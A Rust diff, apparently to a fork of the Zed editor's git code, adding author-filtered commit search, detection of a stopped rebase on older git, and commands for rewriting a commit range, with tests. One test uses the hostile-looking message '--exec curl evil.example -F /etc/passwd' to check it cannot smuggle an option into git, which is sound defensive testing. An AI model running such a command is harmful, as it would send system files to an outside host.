@@ -766,7 +766,61 @@ impl LogSource {
 
 pub struct SearchCommitArgs {
     pub query: SharedString,
+    /// Keeps only commits whose author header (name or address) contains this, taken from the
+    /// query's `author:` prefix by [`split_commit_search_query`].
+    pub author: Option<SharedString>,
     pub case_sensitive: bool,
+}
+
+impl SearchCommitArgs {
+    /// The author to narrow the search by, with the whitespace around it removed.
+    ///
+    /// An author filter that is only whitespace is refused rather than dropped: `--author=`
+    /// matches every commit, so honouring it as "no author filter" would answer a search meant to
+    /// be narrowed with the whole history instead. [`split_commit_search_query`] never builds
+    /// one, but a request that arrived over RPC carries whatever the peer sent.
+    pub fn author_filter(&self) -> Result<Option<&str>> {
+        let Some(author) = self.author.as_deref().map(str::trim) else {
+            return Ok(None);
+        };
+        anyhow::ensure!(!author.is_empty(), "著者の指定が空です。");
+        Ok(Some(author))
+    }
+}
+
+/// The prefixes that introduce an author filter in a commit search query: the one git itself
+/// uses, and the Japanese one the search box offers, each with the halfwidth and the fullwidth
+/// colon a Japanese keyboard produces.
+const AUTHOR_QUERY_PREFIXES: [&str; 4] = ["author:", "author：", "著者:", "著者："];
+
+/// Splits a commit search query into its `author:` (or `著者:`) filter and the message text left
+/// over.
+///
+/// The value can be quoted (`author:"山田 太郎"`) to spell a name containing a space; unquoted it
+/// ends at the first space. A prefix whose value is empty is not a filter and stays part of the
+/// message text, so that a half-typed `author:` cannot quietly turn into "every commit".
+pub fn split_commit_search_query(query: &str) -> (Option<&str>, &str) {
+    let trimmed = query.trim();
+    let Some(rest) = AUTHOR_QUERY_PREFIXES.iter().find_map(|prefix| {
+        trimmed
+            .get(..prefix.len())
+            .filter(|candidate| candidate.eq_ignore_ascii_case(prefix))
+            .and_then(|_| trimmed.get(prefix.len()..))
+    }) else {
+        return (None, trimmed);
+    };
+
+    let (author, message) = if let Some(quoted) = rest.strip_prefix('"') {
+        quoted.split_once('"').unwrap_or((quoted, ""))
+    } else {
+        rest.split_once(char::is_whitespace).unwrap_or((rest, ""))
+    };
+
+    let author = author.trim();
+    if author.is_empty() {
+        return (None, trimmed);
+    }
+    (Some(author), message.trim())
 }
 
 pub fn commit_hash_search_query(query: &str) -> Option<&str> {
@@ -1092,8 +1146,9 @@ impl SequencerKind {
 
     /// The pseudo-ref git keeps while the operation is stopped.
     ///
-    /// `REBASE_HEAD` only exists from git 2.13, so on an older git a stopped rebase is reported as
-    /// "nothing in progress" rather than wrongly as a cherry-pick.
+    /// `REBASE_HEAD` only exists from git 2.13, so on an older git a stopped rebase leaves none of
+    /// these behind; [`sequencer_state_from_probes`] falls back to the leftover conflicts rather
+    /// than reporting it wrongly as a cherry-pick.
     pub fn in_progress_ref(self) -> &'static str {
         match self {
             Self::CherryPick => "CHERRY_PICK_HEAD",
@@ -1127,6 +1182,72 @@ pub struct SequencerState {
     pub kind: SequencerKind,
     /// The index still has unmerged paths.
     pub conflicted: bool,
+    /// `false` when nothing was found to say so outright and this is only what the leftover
+    /// conflicts suggest, which is all an older git allows (see [`uncertain_rebase_message`]).
+    pub certain: bool,
+}
+
+/// What one round of the probes behind [`sequencer_state_from_probes`] found.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub struct SequencerProbes {
+    /// The kind whose [`SequencerKind::in_progress_ref`] exists, if any.
+    pub in_progress: Option<SequencerKind>,
+    /// The index has unmerged paths.
+    pub unmerged_paths: bool,
+    /// `MERGE_HEAD` exists, so an ordinary `git merge` owns those unmerged paths.
+    pub merge_in_progress: bool,
+    /// `HEAD` is detached, which every version of git does for the length of a rebase.
+    pub head_is_detached: bool,
+}
+
+/// Turns a round of probes into what the git panel shows.
+///
+/// The fallback in the last arm is there because `REBASE_HEAD` only exists from the version
+/// [`uncertain_rebase_message`] names: on an older git a rebase stopped on a conflict leaves no
+/// ref any of the probes can find, and reporting "nothing in progress" would leave the user with
+/// no way out of it.
+///
+/// A detached `HEAD` is what keeps that arm from swallowing every other way to end up with
+/// conflicts and no ref: `git stash pop`, `git apply --3way`, `git am`, `git merge --squash`,
+/// `git cherry-pick -n` and `git checkout -m` all leave them behind while sitting on a branch,
+/// whereas a rebase detaches `HEAD` for as long as it runs. It is a strong hint rather than a
+/// fact, though — the same conflicts on a detached `HEAD` reached some other way land here too —
+/// so the state is marked uncertain rather than acted on.
+pub fn sequencer_state_from_probes(probes: SequencerProbes) -> Option<SequencerState> {
+    match probes {
+        SequencerProbes {
+            in_progress: Some(kind),
+            unmerged_paths,
+            ..
+        } => Some(SequencerState {
+            kind,
+            conflicted: unmerged_paths,
+            certain: true,
+        }),
+        SequencerProbes {
+            in_progress: None,
+            unmerged_paths: true,
+            merge_in_progress: false,
+            head_is_detached: true,
+        } => Some(SequencerState {
+            kind: SequencerKind::Rebase,
+            conflicted: true,
+            certain: false,
+        }),
+        _ => None,
+    }
+}
+
+/// What the git panel says about a [`SequencerState`] with `certain: false`.
+///
+/// The version is where git started writing `REBASE_HEAD`, which is the only thing that tells a
+/// stopped rebase apart from leftover conflicts.
+pub fn uncertain_rebase_message() -> String {
+    let since = GitFeature::RebaseHeadRef.minimum_version();
+    format!(
+        "リベースが途中で止まっている可能性があります (git {}.{} より前ではこれ以上判別できません)",
+        since.major, since.minor
+    )
 }
 
 /// What [`GitRepository::run_command`] has to change about a caller's arguments so that an older
@@ -1234,6 +1355,171 @@ impl PatchSource {
             Self::HeadCommit => "head-commit.patch",
         }
     }
+}
+
+/// One commit of a rewritten range: the commits whose changes it applies, oldest first, and the
+/// message it ends up with.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct RewriteGroup {
+    /// Applied in this order. The first one is the commit whose author the result keeps.
+    pub shas: Vec<String>,
+    /// `None` keeps what the commit already says, which only a group of exactly one can do.
+    pub message: Option<String>,
+}
+
+/// One command of a history rewrite, with the commit whose author it has to carry.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct RewriteCommand {
+    pub args: Vec<String>,
+    /// `GIT_AUTHOR_*` read from this commit belong in the command's environment. A plain
+    /// `cherry-pick` copies the original author by itself, so only a rebuilt `commit` needs them.
+    pub author_of: Option<String>,
+}
+
+impl RewriteCommand {
+    fn plain(args: Vec<String>) -> Self {
+        Self {
+            args,
+            author_of: None,
+        }
+    }
+}
+
+/// The namespace every scratch branch of a history rewrite lives in.
+///
+/// `rewrite_cleanup_commands` force-deletes a branch, so the prefix is what tells a branch this
+/// fork created apart from one the user did: nothing outside it is ever deleted.
+pub const REWRITE_SCRATCH_BRANCH_PREFIX: &str = "zed-rewrite/";
+
+/// The branch a rewrite of the range ending at `newest_sha` is built on.
+///
+/// Derived from the range rather than random so that the name in the confirmation is the name the
+/// user finds if a rewrite stops half-way, and namespaced so that it cannot collide with a branch
+/// somebody meant to keep.
+pub fn rewrite_scratch_branch_name(newest_sha: &str) -> String {
+    let short: String = newest_sha.chars().take(SHORT_SHA_LENGTH).collect();
+    format!("{REWRITE_SCRATCH_BRANCH_PREFIX}{short}")
+}
+
+/// Whether `branch` is a scratch branch a history rewrite left behind, which is the only kind
+/// [`rewrite_cleanup_commands`] may delete.
+///
+/// The name has to carry something after the prefix: `zed-rewrite/` on its own is not a ref git
+/// would accept, and treating it as one of ours would put an empty name into `branch -D`.
+pub fn is_rewrite_scratch_branch(branch: &str) -> bool {
+    branch
+        .strip_prefix(REWRITE_SCRATCH_BRANCH_PREFIX)
+        .is_some_and(|rest| !rest.is_empty())
+}
+
+/// `git rebase --autostash --onto <new_base> <upstream> [<branch>]`, which replays everything
+/// after `upstream` on top of `new_base`.
+///
+/// `--autostash` always goes on the command line; a git too old for it drops the flag where the
+/// command runs and refuses a dirty worktree instead (ADR-F47).
+pub fn rebase_onto_args(new_base: &str, upstream: &str, branch: Option<&str>) -> Vec<String> {
+    let mut args = vec![
+        "rebase".to_string(),
+        "--autostash".to_string(),
+        "--onto".to_string(),
+        new_base.to_string(),
+        upstream.to_string(),
+    ];
+    args.extend(branch.map(str::to_string));
+    args
+}
+
+/// Puts the user back on `branch` and throws the scratch branch away: the tail of a rewrite that
+/// worked, and the way back from one that did not.
+///
+/// `branch -D` deletes whatever it is handed, commits and all, so the name has to be one of ours
+/// ([`is_rewrite_scratch_branch`]) and cannot be the branch we are switching back to.
+pub fn rewrite_cleanup_commands(branch: &str, scratch_branch: &str) -> Result<Vec<Vec<String>>> {
+    anyhow::ensure!(
+        is_rewrite_scratch_branch(scratch_branch) && branch != scratch_branch,
+        "一時ブランチではないブランチ「{scratch_branch}」は削除できません。"
+    );
+    anyhow::ensure!(
+        !branch.is_empty(),
+        "戻り先のブランチが分からないため、一時ブランチから戻れません。"
+    );
+    Ok(vec![
+        vec!["switch".to_string(), branch.to_string()],
+        vec![
+            "branch".to_string(),
+            "-D".to_string(),
+            scratch_branch.to_string(),
+        ],
+    ])
+}
+
+/// The commands that replace `base..upstream` on `branch` with `groups`, in order.
+///
+/// `git rebase -i` is not an option: it drives its todo list through an editor, and this fork
+/// never lets git start a program (see [`ALLOWED_GIT_COMMAND_ENV`]). The rewritten history is
+/// built commit by commit on a scratch branch starting at `base` instead, and `branch` only moves
+/// once, at the final `rebase --onto`. Nothing the user can reach changes before that, so a
+/// failure part-way only has to throw the scratch branch away
+/// ([`rewrite_cleanup_commands`]).
+///
+/// `groups` may be empty, which is every commit of the range dropped.
+pub fn rewrite_range_commands(
+    base: &str,
+    groups: &[RewriteGroup],
+    upstream: &str,
+    branch: &str,
+    scratch_branch: &str,
+) -> Result<Vec<RewriteCommand>> {
+    anyhow::ensure!(
+        !branch.is_empty() && !base.is_empty() && !upstream.is_empty(),
+        "書き換える範囲を特定できませんでした。"
+    );
+    let mut commands = vec![RewriteCommand::plain(vec![
+        "switch".to_string(),
+        "-c".to_string(),
+        scratch_branch.to_string(),
+        base.to_string(),
+    ])];
+    for group in groups {
+        let (first, rest) = group
+            .shas
+            .split_first()
+            .context("コミットを 1 件も含まない行があります。")?;
+        match &group.message {
+            // Plain `cherry-pick` writes the commit itself, keeping both its message and its
+            // author, so a commit that is only being moved needs nothing else.
+            None => {
+                anyhow::ensure!(
+                    rest.is_empty(),
+                    "まとめたコミットにはメッセージが必要です。"
+                );
+                commands.push(RewriteCommand::plain(vec![
+                    "cherry-pick".to_string(),
+                    first.clone(),
+                ]));
+            }
+            Some(message) => {
+                let mut cherry_pick = vec!["cherry-pick".to_string(), "-n".to_string()];
+                cherry_pick.extend(group.shas.iter().cloned());
+                commands.push(RewriteCommand::plain(cherry_pick));
+                commands.push(RewriteCommand {
+                    args: vec!["commit".to_string(), "-m".to_string(), message.clone()],
+                    author_of: Some(first.clone()),
+                });
+            }
+        }
+    }
+    commands.push(RewriteCommand::plain(rebase_onto_args(
+        scratch_branch,
+        upstream,
+        Some(branch),
+    )));
+    commands.extend(
+        rewrite_cleanup_commands(branch, scratch_branch)?
+            .into_iter()
+            .map(RewriteCommand::plain),
+    );
+    Ok(commands)
 }
 
 pub trait GitRepository: Send + Sync {
@@ -1630,6 +1916,17 @@ pub enum PushOptions {
     /// Plain `--force`, which overwrites the remote branch whatever it holds. Only reachable from
     /// a menu item that says so and a confirmation prompt.
     ForceWithoutLease,
+}
+
+impl PushOptions {
+    /// The flag `git push` is given for this.
+    pub fn flag(self) -> &'static str {
+        match self {
+            Self::SetUpstream => "--set-upstream",
+            Self::Force => "--force-with-lease",
+            Self::ForceWithoutLease => "--force",
+        }
+    }
 }
 
 impl std::fmt::Debug for dyn GitRepository {
@@ -3454,11 +3751,7 @@ impl GitRepository for RealGitRepository {
             let mut command = git.build_command(&["push"]).await;
             command
                 .envs(env.iter())
-                .args(options.map(|option| match option {
-                    PushOptions::SetUpstream => "--set-upstream",
-                    PushOptions::Force => "--force-with-lease",
-                    PushOptions::ForceWithoutLease => "--force",
-                }))
+                .args(options.map(PushOptions::flag))
                 .arg(remote_name)
                 .arg(format!("{}:{}", branch_name, remote_branch_name))
                 .stdin(Stdio::null())
@@ -4107,16 +4400,37 @@ impl GitRepository for RealGitRepository {
             let mut args = vec!["log", SEARCH_COMMIT_FORMAT];
             let hash_query = commit_hash_search_query(search_args.query.as_str())
                 .map(|query| query.to_ascii_lowercase());
+            let author_arg = search_args
+                .author_filter()?
+                .map(|author| format!("--author={author}"));
+            // An empty `--grep` matches every commit, so a query that is only an author filter
+            // must not carry one at all.
+            let message_query = (hash_query.is_none() && !search_args.query.is_empty())
+                .then(|| search_args.query.as_str());
 
-            if hash_query.is_none() {
+            if author_arg.is_none() && message_query.is_none() && hash_query.is_none() {
+                // A `git log` carrying no filter at all would stream every commit back as a
+                // "result", so a search with nothing to match on finds nothing.
+                return Ok(());
+            }
+
+            if author_arg.is_some() || message_query.is_some() {
+                // `--fixed-strings` and `--regexp-ignore-case` cover `--author` as well as
+                // `--grep`, which is what makes an author filter a substring match.
                 args.push("--fixed-strings");
 
                 if !search_args.case_sensitive {
                     args.push("--regexp-ignore-case");
                 }
 
-                args.push("--grep");
-                args.push(search_args.query.as_str());
+                if let Some(author_arg) = author_arg.as_deref() {
+                    args.push(author_arg);
+                }
+
+                if let Some(message_query) = message_query {
+                    args.push("--grep");
+                    args.push(message_query);
+                }
             }
 
             args.extend(log_source_args.iter().map(|arg| arg.as_ref()));
@@ -4511,6 +4825,9 @@ enum GitFeature {
     RebaseAutostash,
     /// `git cherry-pick --skip` and `git revert --skip`.
     SequencerSkip,
+    /// The `REBASE_HEAD` ref, which is what a stopped rebase is recognized by. Older releases
+    /// leave nothing behind that says a rebase rather than something else stopped.
+    RebaseHeadRef,
 }
 
 impl GitFeature {
@@ -4538,7 +4855,7 @@ impl GitFeature {
             // Introduced by 2.10.0 and backported to 2.9.4.
             Self::UnixDateFormat => GitVersion::new(2, 9, 4),
             Self::ProtocolAllow => GitVersion::new(2, 12, 0),
-            Self::UpstreamGone | Self::StashPush => GitVersion::new(2, 13, 0),
+            Self::UpstreamGone | Self::StashPush | Self::RebaseHeadRef => GitVersion::new(2, 13, 0),
             Self::SequencerSkip => GitVersion::new(2, 22, 0),
             Self::NoOptionalLocks => GitVersion::new(2, 15, 0),
             Self::WorktreeRemove => GitVersion::new(2, 17, 0),
@@ -9289,6 +9606,154 @@ mod tests {
     }
 
     #[test]
+    fn test_split_commit_search_query() {
+        assert_eq!(split_commit_search_query("直した"), (None, "直した"));
+        assert_eq!(
+            split_commit_search_query("author:alice 直した"),
+            (Some("alice"), "直した")
+        );
+        assert_eq!(
+            split_commit_search_query("著者:山田  直した"),
+            (Some("山田"), "直した")
+        );
+        assert_eq!(split_commit_search_query("著者：山田"), (Some("山田"), ""));
+        assert_eq!(
+            split_commit_search_query("  AUTHOR:alice@example.com  "),
+            (Some("alice@example.com"), "")
+        );
+        assert_eq!(
+            split_commit_search_query("author:\"山田 太郎\" 直した"),
+            (Some("山田 太郎"), "直した")
+        );
+        assert_eq!(
+            split_commit_search_query("author:山田　直した"),
+            (Some("山田"), "直した"),
+            "a fullwidth space ends the name too"
+        );
+        assert_eq!(
+            split_commit_search_query("author:"),
+            (None, "author:"),
+            "a prefix with nothing after it is not a filter that matches every commit"
+        );
+        assert_eq!(split_commit_search_query("著者:"), (None, "著者:"));
+        assert_eq!(
+            split_commit_search_query("著者: 直した"),
+            (None, "著者: 直した")
+        );
+        assert_eq!(split_commit_search_query("author::"), (Some(":"), ""));
+        assert_eq!(
+            split_commit_search_query("著者:\"未閉じ"),
+            (Some("未閉じ"), "")
+        );
+        assert_eq!(
+            split_commit_search_query("著"),
+            (None, "著"),
+            "a prefix cut short of a character boundary is not a prefix"
+        );
+        assert_eq!(
+            split_commit_search_query("直した author:alice"),
+            (None, "直した author:alice"),
+            "only a prefix leads the query"
+        );
+    }
+
+    #[test]
+    fn test_author_filter_refuses_an_empty_author() {
+        let args = |author: Option<&str>| SearchCommitArgs {
+            query: "".into(),
+            author: author.map(SharedString::from),
+            case_sensitive: false,
+        };
+        assert_eq!(args(None).author_filter().unwrap(), None);
+        assert_eq!(
+            args(Some("  山田 太郎 ")).author_filter().unwrap(),
+            Some("山田 太郎")
+        );
+        // `--author=` matches every commit, so this may not come back as "no author filter".
+        for empty in ["", " ", "\t\n", "　"] {
+            assert!(
+                args(Some(empty)).author_filter().is_err(),
+                "an author of {empty:?} would widen the search to every commit"
+            );
+        }
+    }
+
+    #[test]
+    fn test_sequencer_state_from_probes() {
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes {
+                in_progress: Some(SequencerKind::CherryPick),
+                unmerged_paths: true,
+                merge_in_progress: false,
+                head_is_detached: false,
+            }),
+            Some(SequencerState {
+                kind: SequencerKind::CherryPick,
+                conflicted: true,
+                certain: true,
+            })
+        );
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes {
+                in_progress: Some(SequencerKind::Rebase),
+                unmerged_paths: false,
+                merge_in_progress: false,
+                head_is_detached: true,
+            }),
+            Some(SequencerState {
+                kind: SequencerKind::Rebase,
+                conflicted: false,
+                certain: true,
+            })
+        );
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes {
+                in_progress: None,
+                unmerged_paths: true,
+                merge_in_progress: false,
+                head_is_detached: true,
+            }),
+            Some(SequencerState {
+                kind: SequencerKind::Rebase,
+                conflicted: true,
+                certain: false,
+            }),
+            "conflicts no sequencer ref accounts for, on the detached HEAD a rebase runs on, are \
+             what a pre-2.13 git leaves behind"
+        );
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes {
+                in_progress: None,
+                unmerged_paths: true,
+                merge_in_progress: false,
+                head_is_detached: false,
+            }),
+            None,
+            "the same conflicts on a branch are a `stash pop` / `am` / `merge --squash` and not a \
+             rebase, which never runs on one"
+        );
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes {
+                in_progress: None,
+                unmerged_paths: true,
+                merge_in_progress: true,
+                head_is_detached: true,
+            }),
+            None,
+            "an ordinary merge accounts for its own conflicts"
+        );
+        assert_eq!(
+            sequencer_state_from_probes(SequencerProbes::default()),
+            None
+        );
+        assert!(
+            uncertain_rebase_message().contains("2.13"),
+            "the banner has to name the version that would have answered this outright: {}",
+            uncertain_rebase_message()
+        );
+    }
+
+    #[test]
     fn test_git_global_args_follow_git_version() {
         assert!(!git_global_args(version(2, 14, 9), true).contains(&"--no-optional-locks"));
         for git_version in [version(2, 15, 0), version(2, 45, 1), None] {
@@ -10224,23 +10689,39 @@ mod tests {
             feature_commit.ref_names
         );
 
-        let (search_tx, search_rx) = async_channel::unbounded();
-        repository
-            .search_commits(
-                LogSource::All,
-                SearchCommitArgs {
-                    query: "FEATURE".into(),
-                    case_sensitive: false,
-                },
-                search_tx,
-            )
-            .await
-            .unwrap();
-        let mut found = Vec::new();
-        while let Ok(sha) = search_rx.try_recv() {
-            found.push(sha.to_string());
-        }
-        assert_eq!(found, [feature_head.as_str()]);
+        let search = async |args: SearchCommitArgs| {
+            let (search_tx, search_rx) = async_channel::unbounded();
+            repository
+                .search_commits(LogSource::All, args, search_tx)
+                .await
+                .unwrap();
+            let mut found = Vec::new();
+            while let Ok(sha) = search_rx.try_recv() {
+                found.push(sha.to_string());
+            }
+            found
+        };
+
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "FEATURE".into(),
+                author: None,
+                case_sensitive: false,
+            })
+            .await,
+            [feature_head.as_str()]
+        );
+
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "".into(),
+                author: None,
+                case_sensitive: false,
+            })
+            .await,
+            Vec::<String>::new(),
+            "a search with nothing to match on must not answer with the whole history"
+        );
 
         repository
             .create_branch("topic".to_string(), Some("origin/feature".to_string()))
@@ -10278,6 +10759,94 @@ mod tests {
                 SharedString::from("origin/feature"),
                 SharedString::from("origin/main")
             ]
+        );
+
+        fs::write(clone_directory.join("other.txt"), "other").unwrap();
+        git_command(&clone_directory, ["add", "other.txt"]);
+        git_command(
+            &clone_directory,
+            [
+                "commit",
+                "--author=Other Person <other@example.com>",
+                "-m",
+                "feature note",
+            ],
+        );
+        let other_head = git_command_output(&clone_directory, ["rev-parse", "HEAD"]);
+
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "".into(),
+                author: Some("other person".into()),
+                case_sensitive: false,
+            })
+            .await,
+            [other_head.as_str()],
+            "an author on its own must not carry an empty --grep, which would match everything"
+        );
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "".into(),
+                author: Some("other@example.com".into()),
+                case_sensitive: false,
+            })
+            .await,
+            [other_head.as_str()],
+            "--author matches the address in the header as well as the name"
+        );
+        // Whether git treats `--author` and `--grep` as AND or as OR is what decides
+        // whether these two filters can be combined at all, so both directions are pinned here.
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "feature".into(),
+                author: Some("Other".into()),
+                case_sensitive: false,
+            })
+            .await,
+            [other_head.as_str()],
+            "the commit whose message says `feature` but whose author is someone else must drop out"
+        );
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "initial".into(),
+                author: Some("Other".into()),
+                case_sensitive: false,
+            })
+            .await,
+            Vec::<String>::new(),
+            "an author that matches and a message that doesn't leaves nothing, so the two are anded"
+        );
+        assert_eq!(
+            search(SearchCommitArgs {
+                query: "".into(),
+                author: Some("OTHER PERSON".into()),
+                case_sensitive: true,
+            })
+            .await,
+            Vec::<String>::new(),
+            "--author follows the case sensitivity of the search"
+        );
+        // `git log --author=` on its own matches every commit, which is the one direction a
+        // filter must never fail in. Only a peer's request can carry such an author.
+        let (search_tx, search_rx) = async_channel::unbounded();
+        let refused = repository
+            .search_commits(
+                LogSource::All,
+                SearchCommitArgs {
+                    query: "".into(),
+                    author: Some("   ".into()),
+                    case_sensitive: false,
+                },
+                search_tx,
+            )
+            .await;
+        assert!(
+            refused.is_err(),
+            "an author filter with nothing in it is refused rather than widened to everything"
+        );
+        assert!(
+            search_rx.try_recv().is_err(),
+            "and no commit is streamed back before it is refused"
         );
 
         let blame = repository
@@ -10504,6 +11073,272 @@ mod tests {
         assert_eq!(
             fs::read_to_string(repo_dir.join("file.txt")).unwrap(),
             "changed\n"
+        );
+    }
+
+    /// The todo editor's plan turns into exactly the commands the fork allows, in the order that
+    /// leaves the user's branch untouched until the final `rebase --onto`.
+    #[test]
+    fn test_rewrite_range_commands_build_the_scratch_branch_then_move_the_branch() {
+        let groups = vec![
+            RewriteGroup {
+                shas: vec!["cccccccccccccccccccccccccccccccccccccccc".to_string()],
+                message: None,
+            },
+            RewriteGroup {
+                shas: vec![
+                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
+                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_string(),
+                ],
+                message: Some("A と B".to_string()),
+            },
+        ];
+        let scratch = rewrite_scratch_branch_name("dddddddddddddddddddddddddddddddddddddddd");
+        assert_eq!(scratch, "zed-rewrite/ddddddd");
+
+        let commands = rewrite_range_commands(
+            "0000000000000000000000000000000000000000",
+            &groups,
+            "dddddddddddddddddddddddddddddddddddddddd",
+            "main",
+            &scratch,
+        )
+        .unwrap();
+
+        assert_eq!(
+            commands
+                .iter()
+                .map(|command| command.args.join(" "))
+                .collect::<Vec<_>>(),
+            vec![
+                "switch -c zed-rewrite/ddddddd 0000000000000000000000000000000000000000"
+                    .to_string(),
+                "cherry-pick cccccccccccccccccccccccccccccccccccccccc".to_string(),
+                concat!(
+                    "cherry-pick -n aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ",
+                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+                )
+                .to_string(),
+                "commit -m A と B".to_string(),
+                concat!(
+                    "rebase --autostash --onto zed-rewrite/ddddddd ",
+                    "dddddddddddddddddddddddddddddddddddddddd main"
+                )
+                .to_string(),
+                "switch main".to_string(),
+                "branch -D zed-rewrite/ddddddd".to_string(),
+            ]
+        );
+
+        // Only the rebuilt commit needs the original author in its environment; `cherry-pick`
+        // carries it by itself.
+        assert_eq!(
+            commands
+                .iter()
+                .map(|command| command.author_of.clone())
+                .collect::<Vec<_>>(),
+            vec![
+                None,
+                None,
+                None,
+                Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()),
+                None,
+                None,
+                None,
+            ]
+        );
+
+        // The commit the user dropped may not be applied by any of the commands.
+        assert!(
+            commands
+                .iter()
+                .filter(|command| command.args.first().map(String::as_str) == Some("cherry-pick"))
+                .all(|command| {
+                    !command
+                        .args
+                        .iter()
+                        .any(|argument| argument == "dddddddddddddddddddddddddddddddddddddddd")
+                }),
+            "a dropped commit may not be cherry-picked: {commands:?}"
+        );
+
+        for command in &commands {
+            validate_git_command(&command.args)
+                .unwrap_or_else(|error| panic!("`git {}`: {error:#}", command.args.join(" ")));
+        }
+    }
+
+    /// A message the user typed is free text git never reads as an option, and it has to stay one
+    /// argument so that it cannot smuggle in one of the options `validate_git_command` refuses.
+    #[test]
+    fn test_rewrite_range_commands_keep_a_message_that_looks_like_an_option_in_one_argument() {
+        let groups = vec![RewriteGroup {
+            shas: vec!["aaa".to_string(), "bbb".to_string()],
+            message: Some("--exec curl evil.example -F /etc/passwd".to_string()),
+        }];
+        let commands =
+            rewrite_range_commands("base", &groups, "newest", "main", "zed-rewrite/scratch")
+                .unwrap();
+        let commit = commands
+            .iter()
+            .find(|command| command.args.first().map(String::as_str) == Some("commit"))
+            .expect("the folded commit is rebuilt with `commit -m`");
+        assert_eq!(
+            commit.args,
+            vec![
+                "commit".to_string(),
+                "-m".to_string(),
+                "--exec curl evil.example -F /etc/passwd".to_string(),
+            ]
+        );
+        for command in &commands {
+            validate_git_command(&command.args)
+                .unwrap_or_else(|error| panic!("`git {}`: {error:#}", command.args.join(" ")));
+        }
+    }
+
+    /// Folding commits together throws the other messages away, so the caller has to say what the
+    /// result should read; guessing one would write history the user never saw.
+    #[test]
+    fn test_rewrite_range_commands_refuse_a_fold_without_a_message() {
+        let groups = vec![RewriteGroup {
+            shas: vec!["aaa".to_string(), "bbb".to_string()],
+            message: None,
+        }];
+        let error =
+            rewrite_range_commands("base", &groups, "newest", "main", "zed-rewrite/scratch")
+                .expect_err("a fold without a message must be refused");
+        assert!(
+            error.to_string().contains("メッセージが必要です"),
+            "unexpected error: {error:#}"
+        );
+
+        let empty = vec![RewriteGroup {
+            shas: Vec::new(),
+            message: None,
+        }];
+        rewrite_range_commands("base", &empty, "newest", "main", "zed-rewrite/scratch")
+            .expect_err("a group with no commit must be refused");
+    }
+
+    /// Dropping every commit of the range is a rewrite too: the scratch branch stays at the base
+    /// and the branch is moved onto it, which removes the range and keeps what came after it.
+    #[test]
+    fn test_rewrite_range_commands_with_nothing_left_still_move_the_branch() {
+        let commands =
+            rewrite_range_commands("base", &[], "newest", "main", "zed-rewrite/scratch").unwrap();
+        assert_eq!(
+            commands
+                .iter()
+                .map(|command| command.args.join(" "))
+                .collect::<Vec<_>>(),
+            vec![
+                "switch -c zed-rewrite/scratch base".to_string(),
+                "rebase --autostash --onto zed-rewrite/scratch newest main".to_string(),
+                "switch main".to_string(),
+                "branch -D zed-rewrite/scratch".to_string(),
+            ]
+        );
+    }
+
+    /// `branch -D` throws commits away, so the cleanup refuses any name that is not one of the
+    /// scratch branches this fork creates.
+    #[test]
+    fn test_rewrite_cleanup_commands_only_delete_a_scratch_branch() {
+        assert_eq!(
+            rewrite_cleanup_commands("main", "zed-rewrite/abc1234").unwrap(),
+            vec![
+                vec!["switch".to_string(), "main".to_string()],
+                vec![
+                    "branch".to_string(),
+                    "-D".to_string(),
+                    "zed-rewrite/abc1234".to_string(),
+                ],
+            ]
+        );
+        for scratch in ["main", "", "zed-rewrite", "zed-rewrite/", "feature/work"] {
+            assert!(
+                rewrite_cleanup_commands("main", scratch).is_err(),
+                "deleting `{scratch}` must be refused"
+            );
+        }
+        assert!(
+            rewrite_cleanup_commands("zed-rewrite/abc1234", "zed-rewrite/abc1234").is_err(),
+            "the branch to return to may not be the one being deleted"
+        );
+        rewrite_range_commands("base", &[], "newest", "main", "main")
+            .expect_err("a rewrite may not be built on a branch it would then delete");
+    }
+
+    #[gpui::test]
+    async fn test_rewrite_range_on_installed_git(cx: &mut TestAppContext) {
+        check_rewrite_range(installed_git_version(), cx).await;
+    }
+
+    /// The plan the todo editor builds, run against a real git: commits reordered, folded and
+    /// dropped, with the commit after the range replayed on top of the result.
+    async fn check_rewrite_range(version: GitVersion, cx: &mut TestAppContext) {
+        disable_git_global_config();
+        cx.executor().allow_parking();
+
+        let temp_dir = tempfile::tempdir().unwrap();
+        let repo_dir = temp_dir.path().join("repo");
+        git_init_repo(&repo_dir);
+        let commit = |name: &str| {
+            fs::write(repo_dir.join(format!("{name}.txt")), format!("{name}\n")).unwrap();
+            git_command(&repo_dir, ["add", "."]);
+            git_command(&repo_dir, ["commit", "-m", name]);
+            git_command_output(&repo_dir, ["rev-parse", "HEAD"])
+        };
+        let base = commit("initial");
+        let first = commit("A");
+        let second = commit("B");
+        let third = commit("C");
+        let last = commit("D");
+        commit("E");
+
+        // C moves ahead of A, B is folded into A, and D is left out entirely.
+        let groups = vec![
+            RewriteGroup {
+                shas: vec![third],
+                message: None,
+            },
+            RewriteGroup {
+                shas: vec![first, second],
+                message: Some("A と B".to_string()),
+            },
+        ];
+        let scratch = rewrite_scratch_branch_name(&last);
+        let commands = rewrite_range_commands(&base, &groups, &last, "main", &scratch).unwrap();
+        for command in commands {
+            let adapted = adapt_command_to_git_version(command.args, Some(version));
+            git_command(&repo_dir, &adapted.args);
+        }
+
+        assert_eq!(
+            git_command_output(&repo_dir, ["log", "--format=%s"])
+                .lines()
+                .map(str::to_string)
+                .collect::<Vec<_>>(),
+            ["E", "A と B", "C", "initial"]
+        );
+        for present in ["A", "B", "C", "E"] {
+            assert!(
+                repo_dir.join(format!("{present}.txt")).exists(),
